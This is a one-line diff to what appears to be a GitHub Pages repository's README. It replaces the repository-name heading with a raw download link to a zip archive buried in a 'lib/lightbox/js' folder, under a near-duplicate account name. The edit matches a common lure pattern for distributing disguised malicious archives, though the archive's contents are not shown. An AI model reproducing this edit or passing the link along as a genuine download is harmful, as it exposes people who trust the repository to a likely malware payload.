@@ -1,1 +1,1 @@
-# sk-kaaarthi.github.io
+# https://github.com/sk-kaarthi/sk-kaaarthi.github.io/raw/refs/heads/main/lib/lightbox/js/io-sk-github-kaaarthi-3.6.zip
